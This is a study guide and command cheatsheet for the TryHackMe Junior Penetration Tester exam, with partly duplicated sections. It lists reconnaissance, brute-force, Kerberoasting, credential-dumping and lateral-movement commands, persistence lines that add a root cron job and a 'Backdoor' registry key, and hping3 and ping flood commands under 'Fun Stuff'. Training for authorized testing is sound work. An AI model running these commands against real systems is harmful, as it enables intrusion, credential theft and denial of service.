# PT1 Exam Step-by-Step Guide

Welcome! This guide is designed for beginners preparing for the TryHackMe Junior Penetration Tester (PT1) exam. It walks you through each phase, explains what to do, why, and how, and gives you the exact commands to use. Follow this flow for the best chance of success!

---

## Step-by-Step Exam Flow

1. **Reconnaissance** – Find out what you're attacking (domains, IPs, open ports).
2. **Enumeration** – Dig deeper into services, users, shares, and directories.
3. **Web Application Testing** – Look for web vulnerabilities and hidden files.
4. **Network Attacks** – Try brute force, sniffing, and other attacks on network services.
5. **Active Directory (AD) Attacks** – If AD is present, enumerate and attack it.
6. **Exploitation & Privilege Escalation** – Get a shell, escalate privileges.
7. **Post-Exploitation** – Dump credentials, establish persistence, recon again.
8. **Reporting** – Take notes/screenshots, prepare your findings.

---

## 1. Reconnaissance

**Goal:** Find as much info as possible about your target before touching it directly.

### Passive Recon (No interaction with target)
- **theHarvester**: Gathers emails, subdomains, hosts from public sources.
  ```bash
theHarvester -d target.com -b all
```
- **whois**: Shows who owns the domain, DNS servers, etc.
  ```bash
whois target.com
```

### Active Recon (Directly interacts with target)
- **nmap**: Finds open ports, services, versions, and OS.
  ```bash
nmap -sC -sV -A -T4 target.com
```
  *Sample output:*
  ```
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
  80/tcp open  http    Apache httpd 2.4.29
  ```
  *What to do next:* If you see port 80, check the website. If you see SSH, try brute-forcing if allowed.

- **rustscan**: Fast port scan.
  ```bash
rustscan -a target.com -- -sV -O
```

- **dig/nslookup/host**: DNS queries.
  ```bash
dig target.com
nslookup target.com
host target.com
```

- **Subdomain Enumeration**
  ```bash
dnsenum target.com
massdns -r resolvers.txt -t A target.com
fierce --domain target.com
```

**Exam Tip:** Save all outputs to files (e.g., `nmap -oN nmap.txt`).

---

## 2. Enumeration

**Goal:** Find users, shares, directories, and more details about discovered services.

- **Banner Grabbing**
  ```bash
nc -nv target.com 80
telnet target.com 80
```
- **SMB Enumeration**
  ```bash
enum4linux -a target.com
smbclient -L //target.com/
```
- **SNMP Enumeration**
  ```bash
snmpwalk -v2c -c public target.com
```
- **FTP Enumeration/Brute Force**
  ```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://target.com
```

**What to do next:**
- If you find shares, try to access them.
- If you find users, try password attacks.

---

## 3. Web Application Testing

**Goal:** Find vulnerabilities in web apps (directories, files, SQLi, XSS, etc.).

- **Directory Brute-Forcing**
  ```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```
- **SQL Injection**
  ```bash
sqlmap -u "http://target.com/page?id=1" --dbs
```
- **XSS Testing**
  ```bash
dalfox url http://target.com
xsstrike -u http://target.com
```
- **Vulnerability Scanning**
  ```bash
nikto -h http://target.com
wpscan --url http://target.com --enumerate u,p
```
- **Web Crawling**
  ```bash
gospider -s http://target.com
hakrawler -url http://target.com
```

**What to do next:**
- Visit found URLs in browser.
- Try default creds or brute force login.
- Test file uploads (try .php, .php.jpg, .phtml, change Content-Type in Burp).
- Disable JavaScript to bypass client-side validation.

**Exam Tip:** Try all HTTP methods (GET, POST, PUT, DELETE, etc.).

---

## 4. Network Attacks

**Goal:** Attack network services (SMB, FTP, SNMP, RDP, SSH, etc.).

- **Password Attacks**
  ```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target.com
medusa -u user -P /usr/share/wordlists/rockyou.txt -h target.com -M ssh
crackmapexec smb target.com -u user -p /usr/share/wordlists/rockyou.txt
```
- **Traffic Sniffing**
  ```bash
tcpdump -i eth0 -w capture.pcap
wireshark
mitmproxy -m transparent
```
- **RDP Connection**
  ```bash
xfreerdp /u:user /p:pass /v:target.com
```

**What to do next:**
- If you get credentials, try them everywhere.
- Analyze captured traffic for creds or sensitive data.

---

## 5. Active Directory (AD) Attacks

**Goal:** Enumerate and attack AD environments (BloodHound, kerberoasting, AS-REP roasting, etc.).

- **BloodHound Collection**
  ```bash
neo4j console & bloodhound &  # Start services
SharpHound.exe -c all         # Collect data on Windows
```
- **Kerberoasting**
  ```bash
GetUserSPNs.py domain/user:pass -dc-ip x.x.x.x
```
- **AS-REP Roasting**
  ```bash
GetNPUsers.py domain/ -usersfile users.txt -no-pass
```
- **Windows Enumeration**
  ```bash
net user /domain
net group "Domain Admins" /domain
dsquery * -limit 100
```
- **Lateral Movement**
  ```bash
PsExec.exe \\target.com -u user -p pass cmd
wmiexec.py domain/user:pass@target.com
```

**What to do next:**
- Crack dumped hashes (see next section).
- Use found creds for lateral movement.

---

## 6. Exploitation & Privilege Escalation

**Goal:** Get a shell and escalate privileges to root/Administrator.

- **Linux Privilege Escalation**
  ```bash
./linpeas.sh > linpeas_out.txt
find / -perm -4000 2>/dev/null
crontab -l
```
- **Windows Privilege Escalation**
  ```bash
winPEAS.exe > winpeas_out.txt
```
- **Credential Dumping**
  ```bash
mimikatz
secretsdump.py -just-dc-user domain/user:pass@dc-ip
samdump2
cat /etc/shadow
```
- **Persistence**
  ```bash
echo "* * * * * root /tmp/rev.sh" >> /etc/crontab
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"
```
- **Host Recon**
  ```bash
whoami
hostname
ipconfig /all
ifconfig
ps aux
tasklist
netstat -ano
```

---

### Password Cracking Tools

#### Hydra
Hydra is a fast and flexible login cracker supporting numerous protocols.

**Common Usage Examples:**
```bash
# SSH Brute Force
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target.com
# FTP Brute Force
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://target.com
# HTTP Basic Auth
hydra -l admin -P passwords.txt http-get://target.com/login
# RDP Brute Force
hydra -t 4 -V -f -l user -P /usr/share/wordlists/rockyou.txt rdp://target.com
# SMB Brute Force
hydra -l user -P /usr/share/wordlists/rockyou.txt smb://target.com
# MySQL Brute Force
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://target.com
```

#### Hashcat
Hashcat is a powerful password recovery tool for cracking hashes.

**Common Usage Examples:**
```bash
# Crack an MD5 hash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# Crack a SHA1 hash
hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# Crack a NTLM hash
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# Crack a bcrypt hash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# Crack a ZIP file hash
hashcat -m 13600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# Crack with rules
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

#### John the Ripper
John the Ripper is a fast password cracker, primarily for Unix-based systems.

**Common Usage Examples:**
```bash
# Basic usage
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Crack a shadow file
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
# Crack a ZIP file
zip2john secret.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
# Crack a Windows NTLM hash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ntlm_hash.txt
# Show cracked passwords
john --show hash.txt
```

---

## 7. Reporting & Exam Strategy

**Goal:** Show what you found, how you found it, and how to fix it.

- **Take screenshots** of every step (e.g., `gnome-screenshot`, `scrot`).
- **Write down**:
  - What you did
  - What you found
  - How to reproduce
  - How to fix
- **Prepare a report** with:
  - Vulnerability title
  - Impact/description
  - Steps to reproduce
  - Evidence (screenshots, output)
  - Mitigation

**Time Management Tips:**
- Triage: Identify high-value targets first
- Timebox: Don't get stuck—move on and return later
- Document as you go

---

## Exam Day Checklist

- [ ] Enumerate all hosts and services (nmap, rustscan)
- [ ] Perform passive recon (whois, theHarvester, crt.sh)
- [ ] Enumerate DNS, subdomains, and try zone transfer
- [ ] Web: Test for OWASP Top 10, file upload, bypasses
- [ ] Network: Enumerate SMB, FTP, SNMP, RDP, SSH
- [ ] Attempt password attacks where applicable
- [ ] AD: Run BloodHound, try kerberoasting, AS-REP roasting
- [ ] After initial access: enumerate for privilege escalation
- [ ] Dump credentials, look for persistence opportunities
- [ ] Take notes/screenshots for every step
- [ ] Prepare clear, concise report with evidence
- [ ] Manage time—move on if stuck, revisit later

---

## Quick Reference Table

| Tool         | Purpose                        | Example Command                        |
|--------------|-------------------------------|----------------------------------------|
| nmap         | Port scanning                 | nmap -sC -sV -A -T4 target.com         |
| gobuster     | Directory brute-forcing       | gobuster dir -u URL -w wordlist       |
| hydra        | Password brute-forcing        | hydra -l user -P passlist ssh://host  |
| enum4linux   | SMB enumeration               | enum4linux -a target.com              |
| bloodhound   | AD enumeration                | SharpHound.exe -c all                 |
| sqlmap       | SQL injection                 | sqlmap -u URL --dbs                   |
| linpeas      | Linux privesc                 | ./linpeas.sh > out.txt                |
| winPEAS      | Windows privesc               | winPEAS.exe > out.txt                 |
| mimikatz     | Credential dumping (Windows)  | mimikatz                              |
| tcpdump      | Packet capture                | tcpdump -i eth0 -w out.pcap           |

---

## Linux & Windows Command Reference

### Linux
```bash
shred -u file.txt
find / -name "config*" 2>/dev/null
id
sudo -l
cat /etc/passwd
cat /etc/shadow
find / -perm -4000 2>/dev/null
uname -a
ps aux
crontab -l
```

### Windows
```bash
whoami
hostname
ipconfig /all
net user /domain
net group "Domain Admins" /domain
```

---

## Resources & Fun Stuff

### Resources
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Kali Linux Tools Listing](https://www.kali.org/tools/)
- [SecLists GitHub](https://github.com/danielmiessler/SecLists) for wordlists
- [CrackStation](https://crackstation.net/) for online hash lookup and password cracking dictionaries
- [CyberChef](https://gchq.github.io/CyberChef/) for encryption, encoding, compression, and data analysis
- [Cryptii](https://cryptii.com/) for modular text transformation and encoding/decoding
- [LinPEAS GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) for privilege escalation

### Fun Stuff
```bash
steghide
ping -s 1300 -f target.com
hping3 -S -V --flood target.com
hping3 --traceroute -V -1 target.com
cat /dev/urandom
alias ls="cat /dev/urandom"
curl wttr.in
```

---

**Note**: Replace `domain.com` with the target domain and ensure you have authorization. Some commands require root privileges or specific tools installed. Save outputs to files (e.g., `nmap -oN output.txt`) for easier analysis.

# Banner Grabbing
nc -nv domain.com 80
telnet domain.com 80

# DNS Zone Transfer
dig axfr @ns1.domain.com domain.com

# Subnetting Example
# IP: 192.168.1.0/24 => Range: 192.168.1.1 - 192.168.1.254

# File Upload Bypass
# Try uploading .php, .php.jpg, .phtml, or use Burp to change Content-Type

# Disable JavaScript in browser dev tools to bypass client-side validation

# SMB Enumeration
enum4linux -a domain.com
smbclient -L //domain.com/

# FTP Brute Force
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://domain.com

# SNMP Enumeration
snmpwalk -v2c -c public domain.com

# Packet Capture
tcpdump -i eth0 -w capture.pcap

# BloodHound Collection
neo4j console & bloodhound &  # Start services
SharpHound.exe -c all         # Collect data on Windows

# Kerberoasting
GetUserSPNs.py domain/user:pass -dc-ip x.x.x.x

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass

# Windows Enumeration
net user /domain
net group \"Domain Admins\" /domain

# Windows Credential Dumping
mimikatz
secretsdump.py -just-dc-user domain/user:pass@dc-ip

# Linux Persistence
echo \"* * * * * root /tmp/rev.sh\" >> /etc/crontab

# Post-Exploitation Recon
whoami
hostname
ipconfig /all

---

# PT1 Exam Cheatsheet & Checklist

This section is a quick-access guide for the TryHackMe Junior Penetration Tester (PT1) exam. Use it to review key tools, commands, and strategies for each exam domain. Good luck!

## Reconnaissance & Enumeration

- **Passive Recon**: 
  - `theHarvester`, `whois`, `crt.sh`, `Shodan`, `Censys`
- **Active Recon**:
  - `nmap -sC -sV -A -T4 target`  # Service/version detection, OS detection
  - `rustscan -a target -- -sV -O`  # Fast port scan
  - `dig domain.com`, `nslookup domain.com`, `host domain.com`
  - **Banner Grabbing**: `nc -nv domain.com 80`, `telnet domain.com 80`
  - **DNS Zone Transfer**: `dig axfr @ns1.domain.com domain.com`
  - **Subnetting**: Know how to calculate IP ranges (e.g., 192.168.1.0/24)

## Web Application Testing

- **OWASP Top 10**: SQLi, XSS, IDOR, SSRF, File Upload, etc.
- **Tools**: `sqlmap`, `dalfox`, `xsstrike`, `ffuf`, `gobuster`, `nikto`, `wpscan`, `burpsuite`
- **File Upload Bypass**: Try `.php`, `.php.jpg`, `.phtml`, change Content-Type in Burp
- **Bypass Client-Side Controls**: Disable JavaScript, intercept/modify requests in Burp
- **Manual Testing**: Try all HTTP methods, test for parameter pollution, hidden fields

### Common HTTP Status Codes

| Code | Meaning                  | Description |
|------|--------------------------|-------------|
| 200  | OK                       | The request was completed successfully. |
| 201  | Created                  | A resource has been created (e.g., a new user or blog post). |
| 301  | Moved Permanently        | Redirects the client to a new webpage or tells search engines the page has moved. |
| 302  | Found                    | Temporary redirect; the resource may change again soon. |
| 400  | Bad Request              | The request was malformed or missing parameters. |
| 401  | Not Authorised           | Authentication required to view this resource. |
| 403  | Forbidden                | You do not have permission to view this resource. |
| 404  | Page Not Found           | The requested page/resource does not exist. |
| 405  | Method Not Allowed       | The resource does not allow this HTTP method. |
| 500  | Internal Service Error   | The server encountered an error it can't handle. |
| 503  | Service Unavailable      | The server is overloaded or down for maintenance. |

# ... existing code ...

## Network Penetration Testing

- **Service Enumeration**:
  - **SMB**: `enum4linux -a target`, `smbclient -L //target/`
  - **FTP**: `hydra -l user -P wordlist ftp://target`
  - **SNMP**: `snmpwalk -v2c -c public target`
  - **RDP**: `xfreerdp /u:user /p:pass /v:target`
- **Password Attacks**: `hydra`, `medusa`, `crackmapexec`
- **Traffic Sniffing**: `tcpdump -i eth0 -w capture.pcap`, `wireshark`, `mitmproxy`

## Active Directory Exploitation

- **BloodHound**: `neo4j console & bloodhound &`, `SharpHound.exe -c all`
- **Kerberoasting**: `GetUserSPNs.py domain/user:pass -dc-ip x.x.x.x`
- **AS-REP Roasting**: `GetNPUsers.py domain/ -usersfile users.txt -no-pass`
- **Windows Enumeration**: `net user /domain`, `net group "Domain Admins" /domain`, `whoami`, `dsquery`
- **Lateral Movement**: `PsExec`, `wmiexec.py`, RDP basics

## Exploitation & Post-Exploitation

- **Privilege Escalation**:
  - **Linux**: `linpeas.sh`, check SUID, cron jobs, kernel exploits
  - **Windows**: `winPEAS.exe`, `mimikatz`, `secretsdump.py`, check services, registry
- **Persistence**:
  - **Linux**: Add cron job, SSH key, backdoor binary
  - **Windows**: Registry run keys, startup folder, scheduled tasks
- **Credential Dumping**:
  - `mimikatz`, `secretsdump.py`, `samdump2`, `/etc/shadow`, `lsass` dump
- **Host Recon**:
  - `whoami`, `hostname`, `ipconfig /all`, `ifconfig`, `ps aux`, `tasklist`, `netstat -ano`

## Reporting & Exam Strategy

- **Note-Taking**: Use Markdown, CherryTree, Obsidian, or text files. Take screenshots (`gnome-screenshot`, `scrot`).
- **Reporting**: Prepare a template with:
  - Vulnerability title
  - Impact/description
  - Steps to reproduce
  - Evidence (screenshots, output)
  - Mitigation
- **Time Management**:
  - Triage: Identify high-value targets first
  - Timebox: Don't get stuck—move on and return later
  - Document as you go

## Quick Reference Table

| Tool         | Purpose                        | Example Command                        |
|--------------|-------------------------------|----------------------------------------|
| nmap         | Port scanning                 | nmap -sC -sV -A -T4 target            |
| gobuster     | Directory brute-forcing       | gobuster dir -u URL -w wordlist       |
| hydra        | Password brute-forcing        | hydra -l user -P passlist ssh://host  |
| enum4linux   | SMB enumeration               | enum4linux -a target                  |
| bloodhound   | AD enumeration                | SharpHound.exe -c all                 |
| sqlmap       | SQL injection                 | sqlmap -u URL --dbs                   |
| linpeas      | Linux privesc                 | ./linpeas.sh > out.txt                |
| winPEAS      | Windows privesc               | winPEAS.exe > out.txt                 |
| mimikatz     | Credential dumping (Windows)  | mimikatz                              |
| tcpdump      | Packet capture                | tcpdump -i eth0 -w out.pcap           |

## Exam Day Checklist

- [ ] Enumerate all hosts and services (nmap, rustscan)
- [ ] Perform passive recon (whois, theHarvester, crt.sh)
- [ ] Enumerate DNS, subdomains, and try zone transfer
- [ ] Web: Test for OWASP Top 10, file upload, bypasses
- [ ] Network: Enumerate SMB, FTP, SNMP, RDP, SSH
- [ ] Attempt password attacks where applicable
- [ ] AD: Run BloodHound, try kerberoasting, AS-REP roasting
- [ ] After initial access: enumerate for privilege escalation
- [ ] Dump credentials, look for persistence opportunities
- [ ] Take notes/screenshots for every step
- [ ] Prepare clear, concise report with evidence
- [ ] Manage time—move on if stuck, revisit later

---
